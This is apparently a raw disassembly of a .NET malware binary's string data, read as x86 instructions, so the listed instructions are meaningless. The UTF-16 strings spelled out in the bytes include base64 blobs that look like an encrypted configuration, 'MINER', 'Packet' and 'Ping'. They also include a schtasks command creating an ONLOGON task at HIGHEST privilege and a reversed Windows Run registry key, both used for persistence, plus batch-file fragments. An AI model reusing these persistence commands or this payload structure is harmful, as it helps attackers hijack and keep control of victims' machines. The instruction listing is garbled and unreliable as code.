  40b881:	6c                   	insb   (%dx),%es:(%edi)
  40b882:	00 68 00             	add    %ch,0x0(%eax)
  40b885:	7a 00                	jp     0x40b887
  40b887:	4b                   	dec    %ebx
  40b888:	00 33                	add    %dh,(%ebx)
  40b88a:	00 2f                	add    %ch,(%edi)
  40b88c:	00 6f 00             	add    %ch,0x0(%edi)
  40b88f:	43                   	inc    %ebx
  40b890:	00 4f 00             	add    %cl,0x0(%edi)
  40b893:	57                   	push   %edi
  40b894:	00 70 00             	add    %dh,0x0(%eax)
  40b897:	79 00                	jns    0x40b899
  40b899:	55                   	push   %ebp
  40b89a:	00 76 00             	add    %dh,0x0(%esi)
  40b89d:	6f                   	outsl  %ds:(%esi),(%dx)
  40b89e:	00 36                	add    %dh,(%esi)
  40b8a0:	00 5a 00             	add    %bl,0x0(%edx)
  40b8a3:	30 00                	xor    %al,(%eax)
  40b8a5:	50                   	push   %eax
  40b8a6:	00 6e 00             	add    %ch,0x0(%esi)
  40b8a9:	4c                   	dec    %esp
  40b8aa:	00 72 00             	add    %dh,0x0(%edx)
  40b8ad:	6a 00                	push   $0x0
  40b8af:	4f                   	dec    %edi
  40b8b0:	00 69 00             	add    %ch,0x0(%ecx)
  40b8b3:	71 00                	jno    0x40b8b5
  40b8b5:	5a                   	pop    %edx
  40b8b6:	00 51 00             	add    %dl,0x0(%ecx)
  40b8b9:	53                   	push   %ebx
  40b8ba:	00 4f 00             	add    %cl,0x0(%edi)
  40b8bd:	51                   	push   %ecx
  40b8be:	00 78 00             	add    %bh,0x0(%eax)
  40b8c1:	38 00                	cmp    %al,(%eax)
  40b8c3:	31 00                	xor    %eax,(%eax)
  40b8c5:	56                   	push   %esi
  40b8c6:	00 6d 00             	add    %ch,0x0(%ebp)
  40b8c9:	68 00 41 00 36       	push   $0x36004100
  40b8ce:	00 37                	add    %dh,(%edi)
  40b8d0:	00 6c 00 6d          	add    %ch,0x6d(%eax,%eax,1)
  40b8d4:	00 68 00             	add    %ch,0x0(%eax)
  40b8d7:	6a 00                	push   $0x0
  40b8d9:	50                   	push   %eax
  40b8da:	00 6c 00 62          	add    %ch,0x62(%eax,%eax,1)
  40b8de:	00 44 00 68          	add    %al,0x68(%eax,%eax,1)
  40b8e2:	00 56 00             	add    %dl,0x0(%esi)
  40b8e5:	6d                   	insl   (%dx),%es:(%edi)
  40b8e6:	00 45 00             	add    %al,0x0(%ebp)
  40b8e9:	38 00                	cmp    %al,(%eax)
  40b8eb:	43                   	inc    %ebx
  40b8ec:	00 4a 00             	add    %cl,0x0(%edx)
  40b8ef:	4a                   	dec    %edx
  40b8f0:	00 66 00             	add    %ah,0x0(%esi)
  40b8f3:	4a                   	dec    %edx
  40b8f4:	00 75 00             	add    %dh,0x0(%ebp)
  40b8f7:	56                   	push   %esi
  40b8f8:	00 70 00             	add    %dh,0x0(%eax)
  40b8fb:	56                   	push   %esi
  40b8fc:	00 4c 00 73          	add    %cl,0x73(%eax,%eax,1)
  40b900:	00 4c 00 6b          	add    %cl,0x6b(%eax,%eax,1)
  40b904:	00 49 00             	add    %cl,0x0(%ecx)
  40b907:	6f                   	outsl  %ds:(%esi),(%dx)
  40b908:	00 43 00             	add    %al,0x0(%ebx)
  40b90b:	72 00                	jb     0x40b90d
  40b90d:	41                   	inc    %ecx
  40b90e:	00 6e 00             	add    %ch,0x0(%esi)
  40b911:	41                   	inc    %ecx
  40b912:	00 5a 00             	add    %bl,0x0(%edx)
  40b915:	41                   	inc    %ecx
  40b916:	00 52 00             	add    %dl,0x0(%edx)
  40b919:	4f                   	dec    %edi
  40b91a:	00 61 00             	add    %ah,0x0(%ecx)
  40b91d:	6c                   	insb   (%dx),%es:(%edi)
  40b91e:	00 58 00             	add    %bl,0x0(%eax)
  40b921:	35 00 59 00 52       	xor    $0x52005900,%eax
  40b926:	00 59 00             	add    %bl,0x0(%ecx)
  40b929:	4d                   	dec    %ebp
  40b92a:	00 44 00 32          	add    %al,0x32(%eax,%eax,1)
  40b92e:	00 4e 00             	add    %cl,0x0(%esi)
  40b931:	53                   	push   %ebx
  40b932:	00 79 00             	add    %bh,0x0(%ecx)
  40b935:	54                   	push   %esp
  40b936:	00 5a 00             	add    %bl,0x0(%edx)
  40b939:	47                   	inc    %edi
  40b93a:	00 76 00             	add    %dh,0x0(%esi)
  40b93d:	4d                   	dec    %ebp
  40b93e:	00 53 00             	add    %dl,0x0(%ebx)
  40b941:	56                   	push   %esi
  40b942:	00 30                	add    %dh,(%eax)
  40b944:	00 5a 00             	add    %bl,0x0(%edx)
  40b947:	44                   	inc    %esp
  40b948:	00 45 00             	add    %al,0x0(%ebp)
  40b94b:	43                   	inc    %ebx
  40b94c:	00 6c 00 47          	add    %ch,0x47(%eax,%eax,1)
  40b950:	00 67 00             	add    %ah,0x0(%edi)
  40b953:	6c                   	insb   (%dx),%es:(%edi)
  40b954:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  40b958:	00 31                	add    %dh,(%ecx)
  40b95a:	00 33                	add    %dh,(%ebx)
  40b95c:	00 42 00             	add    %al,0x0(%edx)
  40b95f:	39 00                	cmp    %eax,(%eax)
  40b961:	33 00                	xor    (%eax),%eax
  40b963:	4e                   	dec    %esi
  40b964:	00 54 00 61          	add    %dl,0x61(%eax,%eax,1)
  40b968:	00 47 00             	add    %al,0x0(%edi)
  40b96b:	67 00 6e 00          	add    %ch,0x0(%bp)
  40b96f:	45                   	inc    %ebp
  40b970:	00 57 00             	add    %dl,0x0(%edi)
  40b973:	54                   	push   %esp
  40b974:	00 42 00             	add    %al,0x0(%edx)
  40b977:	4b                   	dec    %ebx
  40b978:	00 75 00             	add    %dh,0x0(%ebp)
  40b97b:	58                   	pop    %eax
  40b97c:	00 39                	add    %bh,(%ecx)
  40b97e:	00 2b                	add    %ch,(%ebx)
  40b980:	00 67 00             	add    %ah,0x0(%edi)
  40b983:	33 00                	xor    (%eax),%eax
  40b985:	6b 00 36             	imul   $0x36,(%eax),%eax
  40b988:	00 6b 00             	add    %ch,0x0(%ebx)
  40b98b:	6b 00 39             	imul   $0x39,(%eax),%eax
  40b98e:	00 38                	add    %bh,(%eax)
  40b990:	00 79 00             	add    %bh,0x0(%ecx)
  40b993:	43                   	inc    %ebx
  40b994:	00 49 00             	add    %cl,0x0(%ecx)
  40b997:	39 00                	cmp    %eax,(%eax)
  40b999:	44                   	inc    %esp
  40b99a:	00 73 00             	add    %dh,0x0(%ebx)
  40b99d:	64 00 66 00          	add    %ah,%fs:0x0(%esi)
  40b9a1:	65 00 42 00          	add    %al,%gs:0x0(%edx)
  40b9a5:	43                   	inc    %ebx
  40b9a6:	00 67 00             	add    %ah,0x0(%edi)
  40b9a9:	74 00                	je     0x40b9ab
  40b9ab:	79 00                	jns    0x40b9ad
  40b9ad:	2b 00                	sub    (%eax),%eax
  40b9af:	70 00                	jo     0x40b9b1
  40b9b1:	41                   	inc    %ecx
  40b9b2:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40b9b8:	80 b1 59 00 52 00 67 	xorb   $0x67,0x520059(%ecx)
  40b9bf:	00 72 00             	add    %dh,0x0(%edx)
  40b9c2:	35 00 38 00 56       	xor    $0x56003800,%eax
  40b9c7:	00 6a 00             	add    %ch,0x0(%edx)
  40b9ca:	71 00                	jno    0x40b9cc
  40b9cc:	41                   	inc    %ecx
  40b9cd:	00 67 00             	add    %ah,0x0(%edi)
  40b9d0:	58                   	pop    %eax
  40b9d1:	00 52 00             	add    %dl,0x0(%edx)
  40b9d4:	75 00                	jne    0x40b9d6
  40b9d6:	57                   	push   %edi
  40b9d7:	00 69 00             	add    %ch,0x0(%ecx)
  40b9da:	7a 00                	jp     0x40b9dc
  40b9dc:	75 00                	jne    0x40b9de
  40b9de:	39 00                	cmp    %eax,(%eax)
  40b9e0:	55                   	push   %ebp
  40b9e1:	00 54 00 2b          	add    %dl,0x2b(%eax,%eax,1)
  40b9e5:	00 69 00             	add    %ch,0x0(%ecx)
  40b9e8:	4b                   	dec    %ebx
  40b9e9:	00 62 00             	add    %ah,0x0(%edx)
  40b9ec:	69 00 55 00 57 00    	imul   $0x570055,(%eax),%eax
  40b9f2:	75 00                	jne    0x40b9f4
  40b9f4:	31 00                	xor    %eax,(%eax)
  40b9f6:	51                   	push   %ecx
  40b9f7:	00 4d 00             	add    %cl,0x0(%ebp)
  40b9fa:	37                   	aaa
  40b9fb:	00 56 00             	add    %dl,0x0(%esi)
  40b9fe:	44                   	inc    %esp
  40b9ff:	00 41 00             	add    %al,0x0(%ecx)
  40ba02:	6c                   	insb   (%dx),%es:(%edi)
  40ba03:	00 64 00 79          	add    %ah,0x79(%eax,%eax,1)
  40ba07:	00 55 00             	add    %dl,0x0(%ebp)
  40ba0a:	6b 00 50             	imul   $0x50,(%eax),%eax
  40ba0d:	00 72 00             	add    %dh,0x0(%edx)
  40ba10:	37                   	aaa
  40ba11:	00 71 00             	add    %dh,0x0(%ecx)
  40ba14:	72 00                	jb     0x40ba16
  40ba16:	36 00 37             	add    %dh,%ss:(%edi)
  40ba19:	00 7a 00             	add    %bh,0x0(%edx)
  40ba1c:	44                   	inc    %esp
  40ba1d:	00 72 00             	add    %dh,0x0(%edx)
  40ba20:	44                   	inc    %esp
  40ba21:	00 57 00             	add    %dl,0x0(%edi)
  40ba24:	4b                   	dec    %ebx
  40ba25:	00 78 00             	add    %bh,0x0(%eax)
  40ba28:	32 00                	xor    (%eax),%al
  40ba2a:	76 00                	jbe    0x40ba2c
  40ba2c:	2b 00                	sub    (%eax),%eax
  40ba2e:	33 00                	xor    (%eax),%eax
  40ba30:	76 00                	jbe    0x40ba32
  40ba32:	6d                   	insl   (%dx),%es:(%edi)
  40ba33:	00 70 00             	add    %dh,0x0(%eax)
  40ba36:	30 00                	xor    %al,(%eax)
  40ba38:	6a 00                	push   $0x0
  40ba3a:	52                   	push   %edx
  40ba3b:	00 47 00             	add    %al,0x0(%edi)
  40ba3e:	41                   	inc    %ecx
  40ba3f:	00 79 00             	add    %bh,0x0(%ecx)
  40ba42:	43                   	inc    %ebx
  40ba43:	00 43 00             	add    %al,0x0(%ebx)
  40ba46:	68 00 51 00 33       	push   $0x33005100
  40ba4b:	00 32                	add    %dh,(%edx)
  40ba4d:	00 73 00             	add    %dh,0x0(%ebx)
  40ba50:	4d                   	dec    %ebp
  40ba51:	00 36                	add    %dh,(%esi)
  40ba53:	00 50 00             	add    %dl,0x0(%eax)
  40ba56:	52                   	push   %edx
  40ba57:	00 71 00             	add    %dh,0x0(%ecx)
  40ba5a:	6f                   	outsl  %ds:(%esi),(%dx)
  40ba5b:	00 35 00 67 00 32    	add    %dh,0x32006700
  40ba61:	00 50 00             	add    %dl,0x0(%eax)
  40ba64:	67 00 3d             	add    %bh,(%di)
  40ba67:	00 3d 00 00 80 b1    	add    %bh,0xb1800000
  40ba6d:	2f                   	das
  40ba6e:	00 37                	add    %dh,(%edi)
  40ba70:	00 43 00             	add    %al,0x0(%ebx)
  40ba73:	56                   	push   %esi
  40ba74:	00 4d 00             	add    %cl,0x0(%ebp)
  40ba77:	5a                   	pop    %edx
  40ba78:	00 4e 00             	add    %cl,0x0(%esi)
  40ba7b:	70 00                	jo     0x40ba7d
  40ba7d:	38 00                	cmp    %al,(%eax)
  40ba7f:	55                   	push   %ebp
  40ba80:	00 6e 00             	add    %ch,0x0(%esi)
  40ba83:	73 00                	jae    0x40ba85
  40ba85:	54                   	push   %esp
  40ba86:	00 2f                	add    %ch,(%edi)
  40ba88:	00 4a 00             	add    %cl,0x0(%edx)
  40ba8b:	37                   	aaa
  40ba8c:	00 6e 00             	add    %ch,0x0(%esi)
  40ba8f:	73 00                	jae    0x40ba91
  40ba91:	77 00                	ja     0x40ba93
  40ba93:	66 00 68 00          	data16 add %ch,0x0(%eax)
  40ba97:	75 00                	jne    0x40ba99
  40ba99:	61                   	popa
  40ba9a:	00 32                	add    %dh,(%edx)
  40ba9c:	00 49 00             	add    %cl,0x0(%ecx)
  40ba9f:	36 00 36             	add    %dh,%ss:(%esi)
  40baa2:	00 51 00             	add    %dl,0x0(%ecx)
  40baa5:	33 00                	xor    (%eax),%eax
  40baa7:	5a                   	pop    %edx
  40baa8:	00 68 00             	add    %ch,0x0(%eax)
  40baab:	62 00                	bound  %eax,(%eax)
  40baad:	70 00                	jo     0x40baaf
  40baaf:	69 00 39 00 44 00    	imul   $0x440039,(%eax),%eax
  40bab5:	74 00                	je     0x40bab7
  40bab7:	70 00                	jo     0x40bab9
  40bab9:	48                   	dec    %eax
  40baba:	00 68 00             	add    %ch,0x0(%eax)
  40babd:	4d                   	dec    %ebp
  40babe:	00 37                	add    %dh,(%edi)
  40bac0:	00 30                	add    %dh,(%eax)
  40bac2:	00 4e 00             	add    %cl,0x0(%esi)
  40bac5:	64 00 47 00          	add    %al,%fs:0x0(%edi)
  40bac9:	6d                   	insl   (%dx),%es:(%edi)
  40baca:	00 58 00             	add    %bl,0x0(%eax)
  40bacd:	5a                   	pop    %edx
  40bace:	00 4d 00             	add    %cl,0x0(%ebp)
  40bad1:	51                   	push   %ecx
  40bad2:	00 45 00             	add    %al,0x0(%ebp)
  40bad5:	32 00                	xor    (%eax),%al
  40bad7:	36 00 32             	add    %dh,%ss:(%edx)
  40bada:	00 6c 00 4e          	add    %ch,0x4e(%eax,%eax,1)
  40bade:	00 50 00             	add    %dl,0x0(%eax)
  40bae1:	55                   	push   %ebp
  40bae2:	00 64 00 51          	add    %ah,0x51(%eax,%eax,1)
  40bae6:	00 78 00             	add    %bh,0x0(%eax)
  40bae9:	46                   	inc    %esi
  40baea:	00 48 00             	add    %cl,0x0(%eax)
  40baed:	54                   	push   %esp
  40baee:	00 49 00             	add    %cl,0x0(%ecx)
  40baf1:	6b 00 51             	imul   $0x51,(%eax),%eax
  40baf4:	00 72 00             	add    %dh,0x0(%edx)
  40baf7:	61                   	popa
  40baf8:	00 61 00             	add    %ah,0x0(%ecx)
  40bafb:	66 00 45 00          	data16 add %al,0x0(%ebp)
  40baff:	37                   	aaa
  40bb00:	00 6f 00             	add    %ch,0x0(%edi)
  40bb03:	51                   	push   %ecx
  40bb04:	00 79 00             	add    %bh,0x0(%ecx)
  40bb07:	52                   	push   %edx
  40bb08:	00 54 00 4b          	add    %dl,0x4b(%eax,%eax,1)
  40bb0c:	00 62 00             	add    %ah,0x0(%edx)
  40bb0f:	75 00                	jne    0x40bb11
  40bb11:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
  40bb15:	6f                   	outsl  %ds:(%esi),(%dx)
  40bb16:	00 51 00             	add    %dl,0x0(%ecx)
  40bb19:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40bb1e:	80 b1 34 00 44 00 67 	xorb   $0x67,0x440034(%ecx)
  40bb25:	00 69 00             	add    %ch,0x0(%ecx)
  40bb28:	32 00                	xor    (%eax),%al
  40bb2a:	35 00 65 00 69       	xor    $0x69006500,%eax
  40bb2f:	00 38                	add    %bh,(%eax)
  40bb31:	00 56 00             	add    %dl,0x0(%esi)
  40bb34:	4c                   	dec    %esp
  40bb35:	00 37                	add    %dh,(%edi)
  40bb37:	00 31                	add    %dh,(%ecx)
  40bb39:	00 58 00             	add    %bl,0x0(%eax)
  40bb3c:	4f                   	dec    %edi
  40bb3d:	00 45 00             	add    %al,0x0(%ebp)
  40bb40:	43                   	inc    %ebx
  40bb41:	00 62 00             	add    %ah,0x0(%edx)
  40bb44:	32 00                	xor    (%eax),%al
  40bb46:	67 00 4f 00          	add    %cl,0x0(%bx)
  40bb4a:	4a                   	dec    %edx
  40bb4b:	00 78 00             	add    %bh,0x0(%eax)
  40bb4e:	7a 00                	jp     0x40bb50
  40bb50:	75 00                	jne    0x40bb52
  40bb52:	34 00                	xor    $0x0,%al
  40bb54:	58                   	pop    %eax
  40bb55:	00 70 00             	add    %dh,0x0(%eax)
  40bb58:	6d                   	insl   (%dx),%es:(%edi)
  40bb59:	00 74 00 34          	add    %dh,0x34(%eax,%eax,1)
  40bb5d:	00 72 00             	add    %dh,0x0(%edx)
  40bb60:	44                   	inc    %esp
  40bb61:	00 36                	add    %dh,(%esi)
  40bb63:	00 41 00             	add    %al,0x0(%ecx)
  40bb66:	37                   	aaa
  40bb67:	00 31                	add    %dh,(%ecx)
  40bb69:	00 6e 00             	add    %ch,0x0(%esi)
  40bb6c:	6e                   	outsb  %ds:(%esi),(%dx)
  40bb6d:	00 44 00 62          	add    %al,0x62(%eax,%eax,1)
  40bb71:	00 6d 00             	add    %ch,0x0(%ebp)
  40bb74:	77 00                	ja     0x40bb76
  40bb76:	37                   	aaa
  40bb77:	00 32                	add    %dh,(%edx)
  40bb79:	00 42 00             	add    %al,0x0(%edx)
  40bb7c:	70 00                	jo     0x40bb7e
  40bb7e:	48                   	dec    %eax
  40bb7f:	00 54 00 31          	add    %dl,0x31(%eax,%eax,1)
  40bb83:	00 42 00             	add    %al,0x0(%edx)
  40bb86:	6d                   	insl   (%dx),%es:(%edi)
  40bb87:	00 61 00             	add    %ah,0x0(%ecx)
  40bb8a:	35 00 67 00 33       	xor    $0x33006700,%eax
  40bb8f:	00 69 00             	add    %ch,0x0(%ecx)
  40bb92:	50                   	push   %eax
  40bb93:	00 78 00             	add    %bh,0x0(%eax)
  40bb96:	6f                   	outsl  %ds:(%esi),(%dx)
  40bb97:	00 47 00             	add    %al,0x0(%edi)
  40bb9a:	49                   	dec    %ecx
  40bb9b:	00 78 00             	add    %bh,0x0(%eax)
  40bb9e:	78 00                	js     0x40bba0
  40bba0:	46                   	inc    %esi
  40bba1:	00 65 00             	add    %ah,0x0(%ebp)
  40bba4:	79 00                	jns    0x40bba6
  40bba6:	47                   	inc    %edi
  40bba7:	00 63 00             	add    %ah,0x0(%ebx)
  40bbaa:	4a                   	dec    %edx
  40bbab:	00 74 00 66          	add    %dh,0x66(%eax,%eax,1)
  40bbaf:	00 43 00             	add    %al,0x0(%ebx)
  40bbb2:	77 00                	ja     0x40bbb4
  40bbb4:	78 00                	js     0x40bbb6
  40bbb6:	61                   	popa
  40bbb7:	00 6b 00             	add    %ch,0x0(%ebx)
  40bbba:	79 00                	jns    0x40bbbc
  40bbbc:	52                   	push   %edx
  40bbbd:	00 72 00             	add    %dh,0x0(%edx)
  40bbc0:	2f                   	das
  40bbc1:	00 59 00             	add    %bl,0x0(%ecx)
  40bbc4:	6f                   	outsl  %ds:(%esi),(%dx)
  40bbc5:	00 75 00             	add    %dh,0x0(%ebp)
  40bbc8:	4c                   	dec    %esp
  40bbc9:	00 77 00             	add    %dh,0x0(%edi)
  40bbcc:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40bbd1:	01 00                	add    %eax,(%eax)
  40bbd3:	03 35 00 00 09 6e    	add    0x6e090000,%esi
  40bbd9:	00 75 00             	add    %dh,0x0(%ebp)
  40bbdc:	6c                   	insb   (%dx),%es:(%edi)
  40bbdd:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40bbe1:	03 3a                	add    (%edx),%edi
  40bbe3:	00 00                	add    %al,(%eax)
  40bbe5:	0d 50 00 61 00       	or     $0x610050,%eax
  40bbea:	63 00                	arpl   %eax,(%eax)
  40bbec:	6b 00 65             	imul   $0x65,(%eax),%eax
  40bbef:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40bbf3:	09 50 00             	or     %edx,0x0(%eax)
  40bbf6:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  40bbfc:	00 0f                	add    %cl,(%edi)
  40bbfe:	4d                   	dec    %ebp
  40bbff:	00 65 00             	add    %ah,0x0(%ebp)
  40bc02:	73 00                	jae    0x40bc04
  40bc04:	73 00                	jae    0x40bc06
  40bc06:	61                   	popa
  40bc07:	00 67 00             	add    %ah,0x0(%edi)
  40bc0a:	65 00 00             	add    %al,%gs:(%eax)
  40bc0d:	0d 4d 00 49 00       	or     $0x49004d,%eax
  40bc12:	4e                   	dec    %esi
  40bc13:	00 45 00             	add    %al,0x0(%ebp)
  40bc16:	52                   	push   %edx
  40bc17:	00 20                	add    %ah,(%eax)
  40bc19:	00 00                	add    %al,(%eax)
  40bc1b:	03 30                	add    (%eax),%esi
  40bc1d:	00 00                	add    %al,(%eax)
  40bc1f:	0f 7b                	(bad)
  40bc21:	00 30                	add    %dh,(%eax)
  40bc23:	00 3a                	add    %bh,(%edx)
  40bc25:	00 44 00 33          	add    %al,0x33(%eax,%eax,1)
  40bc29:	00 7d 00             	add    %bh,0x0(%ebp)
  40bc2c:	20 00                	and    %al,(%eax)
  40bc2e:	00 0f                	add    %cl,(%edi)
  40bc30:	7b 00                	jnp    0x40bc32
  40bc32:	30 00                	xor    %al,(%eax)
  40bc34:	3a 00                	cmp    (%eax),%al
  40bc36:	58                   	pop    %eax
  40bc37:	00 32                	add    %dh,(%edx)
  40bc39:	00 7d 00             	add    %bh,0x0(%ebp)
  40bc3c:	20 00                	and    %al,(%eax)
  40bc3e:	00 2b                	add    %ch,(%ebx)
  40bc40:	28 00                	sub    %al,(%eax)
  40bc42:	6e                   	outsb  %ds:(%esi),(%dx)
  40bc43:	00 65 00             	add    %ah,0x0(%ebp)
  40bc46:	76 00                	jbe    0x40bc48
  40bc48:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40bc4c:	20 00                	and    %al,(%eax)
  40bc4e:	75 00                	jne    0x40bc50
  40bc50:	73 00                	jae    0x40bc52
  40bc52:	65 00 64 00 29       	add    %ah,%gs:0x29(%eax,%eax,1)
  40bc57:	00 20                	add    %ah,(%eax)
  40bc59:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  40bc5d:	00 70 00             	add    %dh,0x0(%eax)
  40bc60:	65 00 20             	add    %ah,%gs:(%eax)
  40bc63:	00 24 00             	add    %ah,(%eax,%eax,1)
  40bc66:	63 00                	arpl   %eax,(%eax)
  40bc68:	31 00                	xor    %eax,(%eax)
  40bc6a:	00 45 28             	add    %al,0x28(%ebp)
  40bc6d:	00 65 00             	add    %ah,0x0(%ebp)
  40bc70:	78 00                	js     0x40bc72
  40bc72:	74 00                	je     0x40bc74
  40bc74:	38 00                	cmp    %al,(%eax)
  40bc76:	2c 00                	sub    $0x0,%al
  40bc78:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40bc7c:	74 00                	je     0x40bc7e
  40bc7e:	31 00                	xor    %eax,(%eax)
  40bc80:	36 00 2c 00          	add    %ch,%ss:(%eax,%eax,1)
  40bc84:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40bc88:	33 00                	xor    (%eax),%eax
  40bc8a:	32 00                	xor    (%eax),%al
  40bc8c:	29 00                	sub    %eax,(%eax)
  40bc8e:	20 00                	and    %al,(%eax)
  40bc90:	74 00                	je     0x40bc92
  40bc92:	79 00                	jns    0x40bc94
  40bc94:	70 00                	jo     0x40bc96
  40bc96:	65 00 20             	add    %ah,%gs:(%eax)
  40bc99:	00 24 00             	add    %ah,(%eax,%eax,1)
  40bc9c:	63 00                	arpl   %eax,(%eax)
  40bc9e:	37                   	aaa
  40bc9f:	00 2c 00             	add    %ch,(%eax,%eax,1)
  40bca2:	24 00                	and    $0x0,%al
  40bca4:	63 00                	arpl   %eax,(%eax)
  40bca6:	38 00                	cmp    %al,(%eax)
  40bca8:	2c 00                	sub    $0x0,%al
  40bcaa:	24 00                	and    $0x0,%al
  40bcac:	63 00                	arpl   %eax,(%eax)
  40bcae:	39 00                	cmp    %eax,(%eax)
  40bcb0:	00 19                	add    %bl,(%ecx)
  40bcb2:	73 00                	jae    0x40bcb4
  40bcb4:	63 00                	arpl   %eax,(%eax)
  40bcb6:	68 00 74 00 61       	push   $0x61007400
  40bcbb:	00 73 00             	add    %dh,0x0(%ebx)
  40bcbe:	6b 00 73             	imul   $0x73,(%eax),%eax
  40bcc1:	00 2e                	add    %ch,(%esi)
  40bcc3:	00 65 00             	add    %ah,0x0(%ebp)
  40bcc6:	78 00                	js     0x40bcc8
  40bcc8:	65 00 00             	add    %al,%gs:(%eax)
  40bccb:	53                   	push   %ebx
  40bccc:	2f                   	das
  40bccd:	00 63 00             	add    %ah,0x0(%ebx)
  40bcd0:	72 00                	jb     0x40bcd2
  40bcd2:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40bcd6:	74 00                	je     0x40bcd8
  40bcd8:	65 00 20             	add    %ah,%gs:(%eax)
  40bcdb:	00 2f                	add    %ch,(%edi)
  40bcdd:	00 66 00             	add    %ah,0x0(%esi)
  40bce0:	20 00                	and    %al,(%eax)
  40bce2:	2f                   	das
  40bce3:	00 73 00             	add    %dh,0x0(%ebx)
  40bce6:	63 00                	arpl   %eax,(%eax)
  40bce8:	20 00                	and    %al,(%eax)
  40bcea:	4f                   	dec    %edi
  40bceb:	00 4e 00             	add    %cl,0x0(%esi)
  40bcee:	4c                   	dec    %esp
  40bcef:	00 4f 00             	add    %cl,0x0(%edi)
  40bcf2:	47                   	inc    %edi
  40bcf3:	00 4f 00             	add    %cl,0x0(%edi)
  40bcf6:	4e                   	dec    %esi
  40bcf7:	00 20                	add    %ah,(%eax)
  40bcf9:	00 2f                	add    %ch,(%edi)
  40bcfb:	00 52 00             	add    %dl,0x0(%edx)
  40bcfe:	4c                   	dec    %esp
  40bcff:	00 20                	add    %ah,(%eax)
  40bd01:	00 48 00             	add    %cl,0x0(%eax)
  40bd04:	49                   	dec    %ecx
  40bd05:	00 47 00             	add    %al,0x0(%edi)
  40bd08:	48                   	dec    %eax
  40bd09:	00 45 00             	add    %al,0x0(%ebp)
  40bd0c:	53                   	push   %ebx
  40bd0d:	00 54 00 20          	add    %dl,0x20(%eax,%eax,1)
  40bd11:	00 2f                	add    %ch,(%edi)
  40bd13:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  40bd17:	00 20                	add    %ah,(%eax)
  40bd19:	00 22                	add    %ah,(%edx)
  40bd1b:	00 27                	add    %ah,(%edi)
  40bd1d:	00 01                	add    %al,(%ecx)
  40bd1f:	13 22                	adc    (%edx),%esp
  40bd21:	00 27                	add    %ah,(%edi)
  40bd23:	00 20                	add    %ah,(%eax)
  40bd25:	00 2f                	add    %ch,(%edi)
  40bd27:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  40bd2b:	00 20                	add    %ah,(%eax)
  40bd2d:	00 22                	add    %ah,(%edx)
  40bd2f:	00 27                	add    %ah,(%edi)
  40bd31:	00 01                	add    %al,(%ecx)
  40bd33:	05 22 00 27 00       	add    $0x270022,%eax
  40bd38:	01 5d 5c             	add    %ebx,0x5c(%ebp)
  40bd3b:	00 6e 00             	add    %ch,0x0(%esi)
  40bd3e:	75 00                	jne    0x40bd40
  40bd40:	52                   	push   %edx
  40bd41:	00 5c 00 6e          	add    %bl,0x6e(%eax,%eax,1)
  40bd45:	00 6f 00             	add    %ch,0x0(%edi)
  40bd48:	69 00 73 00 72 00    	imul   $0x720073,(%eax),%eax
  40bd4e:	65 00 56 00          	add    %dl,%gs:0x0(%esi)
  40bd52:	74 00                	je     0x40bd54
  40bd54:	6e                   	outsb  %ds:(%esi),(%dx)
  40bd55:	00 65 00             	add    %ah,0x0(%ebp)
  40bd58:	72 00                	jb     0x40bd5a
  40bd5a:	72 00                	jb     0x40bd5c
  40bd5c:	75 00                	jne    0x40bd5e
  40bd5e:	43                   	inc    %ebx
  40bd5f:	00 5c 00 73          	add    %bl,0x73(%eax,%eax,1)
  40bd63:	00 77 00             	add    %dh,0x0(%edi)
  40bd66:	6f                   	outsl  %ds:(%esi),(%dx)
  40bd67:	00 64 00 6e          	add    %ah,0x6e(%eax,%eax,1)
  40bd6b:	00 69 00             	add    %ch,0x0(%ecx)
  40bd6e:	57                   	push   %edi
  40bd6f:	00 5c 00 74          	add    %bl,0x74(%eax,%eax,1)
  40bd73:	00 66 00             	add    %ah,0x0(%esi)
  40bd76:	6f                   	outsl  %ds:(%esi),(%dx)
  40bd77:	00 73 00             	add    %dh,0x0(%ebx)
  40bd7a:	6f                   	outsl  %ds:(%esi),(%dx)
  40bd7b:	00 72 00             	add    %dh,0x0(%edx)
  40bd7e:	63 00                	arpl   %eax,(%eax)
  40bd80:	69 00 4d 00 5c 00    	imul   $0x5c004d,(%eax),%eax
  40bd86:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40bd8a:	61                   	popa
  40bd8b:	00 77 00             	add    %dh,0x0(%edi)
  40bd8e:	74 00                	je     0x40bd90
  40bd90:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40bd94:	53                   	push   %ebx
  40bd95:	00 00                	add    %al,(%eax)
  40bd97:	03 22                	add    (%edx),%esp
  40bd99:	00 00                	add    %al,(%eax)
  40bd9b:	09 2e                	or     %ebp,(%esi)
  40bd9d:	00 62 00             	add    %ah,0x0(%edx)
  40bda0:	61                   	popa
  40bda1:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40bda5:	13 40 00             	adc    0x0(%eax),%eax
  40bda8:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40bdac:	68 00 6f 00 20       	push   $0x20006f00
  40bdb1:	00 6f 00             	add    %ch,0x0(%edi)
  40bdb4:	66 00 66 00          	data16 add %ah,0x0(%esi)
  40bdb8:	00 1f                	add    %bl,(%edi)
  40bdba:	74 00                	je     0x40bdbc
  40bdbc:	69 00 6d 00 65 00    	imul   $0x65006d,(%eax),%eax
  40bdc2:	6f                   	outsl  %ds:(%esi),(%dx)
  40bdc3:	00 75 00             	add    %dh,0x0(%ebp)
  40bdc6:	74 00                	je     0x40bdc8
  40bdc8:	20 00                	and    %al,(%eax)
  40bdca:	33 00                	xor    (%eax),%eax
  40bdcc:	20 00                	and    %al,(%eax)
  40bdce:	3e 00 20             	add    %ah,%ds:(%eax)
